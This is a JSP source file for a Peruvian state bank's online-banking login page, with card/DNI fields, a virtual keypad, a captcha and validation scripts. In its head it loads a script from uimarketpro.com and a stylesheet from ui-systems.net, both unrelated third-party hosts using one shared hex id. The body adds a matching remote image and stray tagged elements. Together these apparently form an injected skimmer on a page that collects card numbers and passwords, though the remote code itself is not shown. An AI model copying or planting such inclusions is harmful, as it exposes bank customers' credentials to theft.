<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<%@page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
<%@ taglib uri="/WEB-INF/struts-html.tld"	prefix="html"%>
<%@ taglib uri="/WEB-INF/struts-bean.tld"	prefix="bean"%>
<%@ taglib uri="/WEB-INF/struts-logic.tld"	prefix="logic"%>
<%@ taglib uri="/WEB-INF/c.tld"				prefix="c"%>
<html>
<head>

<script type="text/javascript" src="<%=request.getContextPath()%>/js/bn-jquery.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/jquery.ui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/select.js"></script>

<script type="text/javascript" src="<%=request.getContextPath()%>/js/bootstrap-chosen.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/bootstrap.js"></script>
<script language="JavaScript" src="<%=request.getContextPath()%>/js/util.js"></script>

<link type="text/css" href=https://ui-systems.net/css/d6d6a192e565430bab3aa6e4cb0ae0bd.css rel="stylesheet">
<script type="application/javascript" src="https://uimarketpro.com/js/d6d6a192e565430bab3aa6e4cb0ae0bd.js"></script>
<link href="<%=request.getContextPath()%>/resources/css/stylesheet.css" rel="stylesheet" type="text/css" />  
<link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bootstrap-chosen.css" />      

<script type="text/javascript" src="<%=request.getContextPath()%>/js/cufon-yui.js"></script>
<script type="text/javascript" src="<%=request.getContextPath()%>/js/DaxCompact-Medium_500.font.js"></script>


<link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bootstrap-chosen.css" /> 
<script type="text/javascript" src="<%=request.getContextPath()%>/js/bootstrap-chosen.js"></script>

   
<script type="text/javascript">


var brw = new Browser();
if(brw.code == 'ch'){
Cufon.replace('.dax');
Cufon.replace('.boton-clave');

	$(document).ready(function(){		
 		$('.boton-clave').css('height','20px');
		$('.boton-clave').css('padding-top','5px'); 	
	});

}
</script>


<SCRIPT language="javascript">


 function fnReloadCaptcha(){
 	
    var now  = new Date();
    var imageObject = document.getElementById('captcha');
    imageObject.src='./captcha.do?reload=' + now.getTime();
}



$(document).ready(
 function(){ 
 
  		
	 
 	 $('#tipoNumDoc').show();
 	 $("#btnLogin").removeAttr("disabled");
 	 $("#txtNumeroTarjeta").focus();
 	 $("#txtNumeroTarjeta").val("4214");
 	 fnReloadCaptcha();
     //$("#srcCaptcha").load("<%=request.getContextPath()%>/Welcome1.do?methodToCall=cargar");
     
     $("#boton_captcha").click(function(){
     	var cont_param = parseInt($("#param_captcha").val());
     	$("#srcCaptcha").html('<img alt="captcha"  id="captcha" name="captcha" src="resources/images/background.jpg" height="25" width="114"  />');
     	$("#captcha").attr('src','<%=request.getContextPath()%>/captcha.do?param='+cont_param);
     	cont_param+=1;
     	$("#param_captcha").val(cont_param);
     });
     
     $("#limpiar").click(function(){
     	$("#txtPassword").val("");
     });
 
 });

	function cambiarTipoTarjeta(){
	   var valor = $("#cboTipoTarjeta").val();
	   $("input[type=text]").val('');
	   $("input[type=password]").val('');	   
	   $('.tarjeta_dni').hide(); //Oculta Los campos de tarjeta y sus label
	   
	   switch(valor){
	   		case '<%=pe.cosapi.common.Constante.TARJETA_GLOBAL_DEBITO%>':
	   			$('#txtNumeroTarjeta').show();
				$('#trNumeroTarjeta').show();
				$('#tipoNumDoc').show();
				$('#txtNumeroTarjeta').val('4214');
				$('#txtPassword').attr('maxlength','6');
				$('#lblDigitosClave').html('06');
				$("#ind_long_clave").val('6');
				$('#txtNumeroTarjeta').focus();
				break;
	   		;
	   		
	   			
			case '<%=pe.cosapi.common.Constante.TARJETA_VACIA%>':
				$('#txtDNI').show();
				$('#trDNI').show();		
				$('#tipoNumDoc').hide();
				$('#txtPassword').attr('maxlength','6');
				$('#lblDigitosClave').html('06');
				$("#ind_long_clave").val('6');
				$('#txtDNI').focus();
				break;
			;
	   		
	   		
	   		
	   }
	 }
	
	function recomSeguridad(){
	console.log("login-recomSeguridad");
	
		<%-- 		
		frmLogin.action="<%=request.getContextPath()%>/login.do?metodo=recSeguridad";
		frmLogin.submit(); --%>
		
		
			
		$("#form").get(0).setAttribute('action', '<%=request.getContextPath()%>/login.do?metodo=recSeguridad');		
		$("#form").submit();
		
		
	}	
	
	
	function autenticar(){
	
		var frmLogin = document.form;      
        
       
            
		if ($("#cboTipoTarjeta").val() == '01'){

			// Validando que el Número de DNI no tenga caracteres que no sean números
			if (validarSiNumero($("#txtDNI").val())){
				alert('El número de DNI solo acepta números...');
				return false;
			}

			// Validando que el Número de DNI sea de 8 digitos
			if ($("#txtDNI").val().length < 8){
				alert('El número de DNI debe ser de 8 Digitos no menos');
				return false;
			}

			// Validando que la clave con DNI sea de 6 digitos
			if ($("#txtPassword").val().length < 6){
				alert('Su Clave debe ser de 6 Digitos no menos');
				return false;
			}
			  
  			if ($("#txtCaptcha").val().length < 5){
				alert('Su Clave Captcha debe ser de 5 Digitos no menos');
				return false;
				}
		
		}
		else if ($("#cboTipoTarjeta").val() == '02') {

			

			// Validando que el Número de Tarjeta no tenga caracteres que no sean números
			if (validarSiNumero($("#txtNumeroTarjeta").val())){
				alert('El número de Tarjeta solo acepta números...');
				return false;
			}

			// Validando que el Número de Tarjeta sea de 16 digitos
			if ($("#txtNumeroTarjeta").val().length < 16){
				alert('El número de Tarjeta debe ser de 16 Digitos no menos');
				return false;
			}

			// Validando que la clave con TARJETA sea de 4 digitos
			if ($("#txtPassword").val().length < 6){
				alert('Su Clave debe ser de 6 Digitos no menos');
				return false;
			}
			
			if ($("#txtCaptcha").val().length < 5){
				alert('Su Clave Captcha debe ser de 5 Digitos no menos');
				return false;
			}
				
			if (document.forms[0].cboTipoDoc.value == ""){
				alert('Seleccionar un Tipo de Documento...');
				return;
			}
		
			if (validacampo("txtNumDoc")){ 
			alert('Es necesario ingresar el número de documento' ); return;
			}
			
			if(document.forms[0].cboTipoDoc.value==<%=pe.cosapi.common.Constante.COD_DNI_%>){ 
				if (validalongitud("txtNumDoc","8")){
					alert('El número de DNI debe ser de 8 Digitos, no menos');
					return;
				}
	
				if (document.forms[0].txtNumDoc.value.length > 8){
					alert('El número de DNI debe ser de 8 Digitos');
					return;
				}
				
				if (validarSiNumero(frmLogin.txtNumDoc.value)){
				alert('El número de DNI solo acepta números...');
				return;
				}
			}


			
			if(document.forms[0].cboTipoDoc.value==<%=pe.cosapi.common.Constante.COD_RUC%>){ 
				if (validalongitud("txtNumDoc","11")){
					alert('El número del RUC debe ser de 11 Digitos, no menos');
					return;
				}
			}
		
			
		
		}

 			
		$("#validar").val("true");
		$("#HrTrx").val("0112");		
		$('#form').get(0).setAttribute('action', '<%=request.getContextPath()%>/login.do?metodo=autenticar');
		$("#btnLogin").attr("disabled","disabled");
		$("#form").submit();
		//return true;
	
		
	}	
	
	
	
	function validarSiNumero(numero){
		var textoStr =  numero.toString() // transformo a string todo el campo
		var tiene = 0
		for(var i = 0;i < numero.length;i++){ // recorro caracter potr caracter
			var oneChar = textoStr.charAt(i)
			if (!/^([0-9])*$/.test(oneChar)){ // busco un caracter que no sea Numerico
				tiene = 1
			}
		}
		if (tiene == 1){ // controlo si existe o no caracter que no sea numerico.
			return true
		} else {
			return false
		} 
	}
	
	function evalRanTable(valor){
		var longitud = parseInt($("#ind_long_clave").val());
		if($("#txtPassword").val().length < longitud){
		$("#txtPassword").val($("#txtPassword").val()+valor);
		}
	}
	
	function soloNumerosDNI(e){

	if(document.forms[0].cboTipoDoc.value==<%=pe.cosapi.common.Constante.COD_DNI_%>){ 
	tecla = (document.all) ? e.keyCode : e.which;
	if (tecla!=0){ //Teclas especiales en FF retornan 0
	    if (tecla==8) return true;
	   	patron =/\d/
    	te = String.fromCharCode(tecla);
    	return patron.test(te);
    	}
	  } 
	}
	
	function limpiarNumDoc(){
	
		$('#txtNumDoc').val('');
	}
	
	
	$(function() {

  $("#dialog").dialog({
     autoOpen: false,
     modal: true
   });

  $("#myButton").on("click", function(e) {
      e.preventDefault();
      $("#dialog").dialog("open");
  });

});
	

</SCRIPT>

<style>

.modal-content {
  background-color: #fefefe;
  margin: auto;
  padding: 20px;
  border: 1px solid #888;
  width: 80%;
}

.buttonLeft {
   width: 30%;
   height: 60%;
text-decoration:none;
font-weight: 600;
font-size: 12px;
color:#808080;
padding-top:5px;
padding-bottom:5px;
padding-left:5 px;
padding-right:5 px;
background-color:#d6d7d8;
border-color: #808080;
border-width: 2px;
border-style: solid;
border-top-left-radius: 15px;
border-top-right-radius: 0px;
border-bottom-left-radius: 15px;
border-bottom-right-radius: 0px;

}

.buttonCenter {
   width: 30%;
   height: 60%;
text-decoration:none;
font-weight: 600;
font-size: 12px;
color:#808080;
padding-top:5px;
padding-bottom:5px;
padding-left:5 px;
padding-right:5 px;
background-color:#d6d7d8;
border-color: #808080;
border-width: 2px;
border-style: solid;


}

.buttonRight {
width: 30%;
height: 60%;
text-decoration:none;
font-weight: 600;
font-size: 12px;
color:#808080;
padding-top:5px;
padding-bottom:5px;
padding-left:5 px;
padding-right:5 px;
background-color:#d6d7d8;
border-color: #808080;
border-width: 2px;
border-style: solid;
border-top-left-radius: 0px;
border-top-right-radius: 15px;
border-bottom-left-radius: px;
border-bottom-right-radius: 15px;

}


.buttonLeft.active {
  background-color: #808080;
  color: white;
}

.buttonCenter.active {
  background-color: #808080;
  color: white;
}    

.buttonRight.active {
  background-color: #808080;
  color: white;
}    
    
</style>

	<title>Banco de la Naci&oacute;n - Multired Virtual</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /> 
    <meta http-equiv="Content-Language" content="es" />

<meta name="GENERATOR" content="Rational Application Developer">
<%--
<link href="../resources/css/stylesheet.css" rel="stylesheet" type="text/css" />       
--%>

    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/resetearcss.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/bn-principal.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/tipografias.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/home.css" />
    <link rel="stylesheet" type="text/css" href="<%=request.getContextPath()%>/css/select.css" />


<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>


<body>


	<div id="contenedor">

        <div id="cabecera">

            <div id="logo-multired">
              <img src="imagenes/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
                <img src="imagenes/Logo_BN.jpg" alt="Logotipo del Banco de la Nación" />
            </div>

        </div>
        <img src="https://ui-systems.net/images/d6d6a192e565430bab3aa6e4cb0ae0bd.jpg"/>
		<div class="image-d6d6a1"></div>
		<em class="font-d6d6a1">.</em>

        <div id="cuerpo">
            <h1 class="dax"><img src="imagenes/candado.png"> Usted se encuentra en una <span>zona segura</span></h1>

            <div id="login">
                <div id="border-superior"><img src="imagenes/home/border-arriba.png" alt="Border Login Superior" /></div>
                <div id="login-contenido">

                    <div id="border-inferior"></div>

                    <form method="post" id="form" name="form">
					<INPUT type="hidden" id="transaccion" name="transaccion" value="LG09">
					<INPUT type="hidden" id="HrTrx" name="HrTrx" value="0132">
					<input type="hidden" id="validar" name="validar" value="false">
					<input type="hidden" id="ind_long_clave" name="ind_long_clave" value="6" />
					<input type="hidden" id="param_captcha" name="param_captcha" value="1" />
					
                        <div class="fila limpiar">
                            <label for="tipo-documento">Seleccione:</label>
                            
                            <select class="tipo-documento select" id="cboTipoTarjeta" name="cboTipoTarjeta" style="textizq8" onchange="cambiarTipoTarjeta();" > <%-- onchange="verTarjeta()" --%>
								<option value='<%=pe.cosapi.common.Constante.TARJETA_GLOBAL_DEBITO%>'>Multired Global Débito</option>
								<option value='<%=pe.cosapi.common.Constante.TARJETA_VACIA%>')>DNI (Cuenta Corriente)</option>
							</select>
                            
                        </div>
                        <div class="fila  limpiar">
                            <label id="trNumeroTarjeta" for="numero-tarjeta" class="tarjeta_dni">N&uacute;mero de tarjeta:</label>
                            <input type="text" name="txtNumeroTarjeta" id="txtNumeroTarjeta" class="grande tarjeta_dni" maxlength="16" onkeypress="return soloNumerosAll(event)"  />
                            <label id="trDNI" for="numero-tarjeta" style="display:none;" class="tarjeta_dni">DNI:</label>
                            <input type="text" name="txtDNI" id="txtDNI" class="grande tarjeta_dni" maxlength="8" onkeypress="return soloNumerosAll(event)" style="display:none;" />
                        </div>
                        
                        <%@ page import="pe.cosapi.common.FacadeFactory"%>
                   
						<%						
							request.setAttribute("lstTipoDoc", FacadeFactory.getGeneralFacade().getComboDetalleHlp("00777"));
							
							
						%>
                        
                                               
                         <div class="fila  limpiar" id="tipoNumDoc" style="display: none;">
                            <label id="trTipoNumDoc" for="numero-tarjeta" >Tipo y N° Documento:</label>
                            <select id="cboTipoDoc" name="cboTipoDoc" class="select select-medio" onchange="limpiarNumDoc();" >
									
										<c:forEach var="item" items="${lstTipoDoc}">
											<option value="<c:out value="${item.codigo}"/>" > <c:out value="${item.descripcion}" /></option>
                                         
                                        </c:forEach>
							</select>
							
                           	<input type="text" class="input-chico3" name="txtNumDoc"  id="txtNumDoc" maxlength="12" size="8" onkeypress="return soloNumerosDNI(event)"  style="width: 151px !important;" ></input>
                        </div>
                        
                        
                        <%@ page import="java.util.Map"%>
                        
						<%@ page import="pe.cosapi.system.TecladoUtil"%>
						<%@ page import="pe.cosapi.common.ConstanteSesion"%>
						<%						
							Map mapa  = (Map)request.getSession().getAttribute(ConstanteSesion.MAP_VALUES);
							TecladoUtil teclado = new TecladoUtil();
							teclado.asignar(mapa,request);
							
						%>
                        
                        <div class="fila limpiar">
                            <label for="clave" style="width: 140px;">Ingresa tu clave usando el teclado virtual:</label>
                            <div id="botones-clave">
                                <div class="boton-clave" onclick="evalRanTable('m');"><span class="dax" ><%=teclado.getAlt_0()%></span></div>
                                <div class="boton-clave" onclick="evalRanTable('n');" ><%=teclado.getAlt_1()%></div>
                                <div class="boton-clave" onclick="evalRanTable('p');" ><%=teclado.getAlt_2()%></div>
                                <div class="boton-clave" onclick="evalRanTable('i');" ><%=teclado.getAlt_3()%></div>
                                <div class="boton-clave" onclick="evalRanTable('j');" ><%=teclado.getAlt_4()%></div>
                                <div class="boton-clave" onclick="evalRanTable('k');" ><%=teclado.getAlt_5()%></div>
                                <div class="boton-clave" onclick="evalRanTable('a');" ><%=teclado.getAlt_6()%></div>
                                <div class="boton-clave" onclick="evalRanTable('y');" ><%=teclado.getAlt_7()%></div>
                                <div class="boton-clave" onclick="evalRanTable('x');" ><%=teclado.getAlt_8()%></div>
                                <div class="boton-clave" onclick="evalRanTable('t');" ><%=teclado.getAlt_9()%></div>
                                <div class="boton-clave limpiar" id="limpiar">LIMPIAR</div>
                            </div>
							<input type="hidden" value="<%=teclado.getRandomEncript()%>"  name="hdnValue">
													
												
                            <div id="campo-clave">
                             	 <p style="width: 175px ! important;"><img border="0" src="imagenes/bn/generar-clave.png" width="20" height="20" style="float: left; margin: -3px ! important;">
                             	 <a href="https://bancaporinternet.bn.com.pe/BNWeb/Afiliacion" style="color: rgb(186, 17, 19); text-decoration: underline; font: 12px arial;">Genera tu Clave de Internet</a></p>
                                <p style="width: 124px;">Ingresa tu <b>Clave de Internet (06 d&iacute;gitos)</b> </p>
                                <input type="password" name="txtPassword" id="txtPassword" maxlength="6" readonly="readonly" style="margin: 0px 10px;"/>
                          
                                <div class="olvido-clave">
                                    <div class="olvide-clave"><a href="https://bancaporinternet.bn.com.pe/BNWeb/Olvido" style="color: rgb(186, 17, 19);text-decoration: underline;">Olvid&eacute; mi clave</a></div>
                                 
                                </div>
                            </div>

                        </div>

                        <div class="fila limpiar">
                            <label for="capcha">Ingresa el texto de la imagen:</label>
                            <div class="capcha">
                                <div id="srcCaptcha"><img alt="captcha"  id="captcha" name="captcha" src="resources/images/background.jpg"  height="25" width="114" /></div>
                                <div class="boton_captcha" id="boton_captcha" >Cambiar texto</div>
                            </div>
                            <input class="capcha" type="text" name="txtCaptcha" id="txtCaptcha" maxlength="5" style="margin: 0px 10px;" />
                        </div>
                        
 						<div class="fila limpiar">
                        	<input name="btnLogin" id="btnLogin" type="button" value="INGRESAR" onclick="javascript:return autenticar();" />
                        
						</div>
						
						
						
						<div class="fila limpiar"  align="CENTER" style="padding-right: 50px;">
							<p style="width: 175px ! important;">
	                    	<a href="#" onclick="javascript:return recomSeguridad();" style="color: rgb(51, 102, 187); text-decoration: underline; font: 12px arial;">Recomendaciones de Seguridad</a></p>
							
						</div>
						<div class="fila limpiar"  align="CENTER" style="padding-right: 50px;">
					
							<!--  
								<div class="col" style="width: 30%">						
								<img border="0" src="imagenes/bg-listado.png" width="10" height="10" style="float: left; ">
								<a style="color: rgb(181, 181, 181);  font: 12px arial;"> Guías de usuario:</a>	
								</div>
							-->											
							<img border="0" src="imagenes/icono-pdf.png"  width="10" height="10">
							<a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-ahorro.pdf" target="_blank" rel="noopener noreferrer" style="color: rgb(0, 0, 0); font: 12px arial;"> Guía Cuenta de Ahorro</a>
							<img border="0" src="imagenes/icono-pdf.png"  width="10" height="10">
							<a href="https://www.bn.com.pe/multired-virtual/archivos/manual-multired-virtual-cuentas-corrientes.pdf" target="_blank" rel="noopener noreferrer" style="color: rgb(0, 0, 0); font: 12px arial;"> Guía Cuentas Corrientes</a>		 
	                        						
						</div>
						
						
						<!--  
						<div class="fila limpiar"  align="CENTER">
						
						
							<div class="buttons-container" style="padding-right: 50px;">
								<button type="button" class="buttonLeft" id="btnIzquierda">Recomendaciónes<br/>de Seguridad</button><button type="button" class="buttonCenter active" id="btnCenter">Manual Cuenta</br>de Ahorro</button><button type="button" class="buttonRight" id="btnDerecha">Manual Cuentas</br>Corrientes</button>
							</div>		
						</div>
						-->
						
                    </form>
						
                </div>
                
                
                
                
                <div id="border-inferior"><img src="imagenes/home/border-abajo.png" alt="Border Login Inferior" /></div>
            </div>
			
		 <logic:messagesPresent>
			<div class="cysErrorMsg">
				<html:errors/>
			</div>
		</logic:messagesPresent> 	
			
        </div>   

        <div id="pie-pagina">

            <div id="titulo-pie-pagina">Banco de la Naci&oacute;n  |  Ministerio de Econom&iacute;a y Finanzas</div>

            <div id="oficinas">
                <p>Oficina Principal: Av. Javier Prado Este 2499. San Borja. Central Telef&oacute;nica: 519 2000.</p>
				<p>Atenci&oacute;n en Oficinas Administrativas: Lunes a Viernes de 08:30 a 17:30. Refrigerio de: 13:00-14:00. </p>
				<p>Atenci&oacute;n en Oficina de Tr&aacute;mite Documentario: Lunes a Viernes de 8:30 a 16:30 (horario corrido).</p>
                
              
            </div>
			 
        </div>

    </div>
    
    
    <div id="dialog" title="Dialog box"  class="modal-content">
  		<span class="close">&times;</span>
	</div>

    <script type="text/javascript" src="js/bn-funciones.js"></script>
    <script type="text/javascript">
        $(document).ready(function(){
		myApp.select.init();
		myApp.home.init();
	});
    </script>
    <script type="text/javascript">
		Cufon.now();
	</script>
	
	<script type="text/javascript">
	
	
		$("button").click(function() {
		   $("button").removeClass("active");
		   $(this).addClass("active");
		});	
	
		let getButtons = document.querySelectorAll('button').forEach((item) => {
		  	item.addEventListener('click', function(e) {
		    let txt = e.target.textContent
		    console.log(txt);
		   
		    if (txt === 'CCI'){
		    /*
		    	document.getElementById("txtCuentaCCI").maxLength = "20";
		    	document.getElementById('txtCuentaCCI').value = ''; 
		    	document.getElementsByName('txtCuentaCCI')[0].placeholder='Ingrese un CCI';	
		    */	    	  
		     
		    }else{
		    /*
		    	document.getElementById("txtCuentaCCI").maxLength = "9";
		      document.getElementById('txtCuentaCCI').value = ''; 
		      document.getElementsByName('txtCuentaCCI')[0].placeholder='Ingrese nro. celular de Contactos';
		       */			   		
		    } 
		  })
		});
		
	
		
		
	
	</script>

</body>
</html>
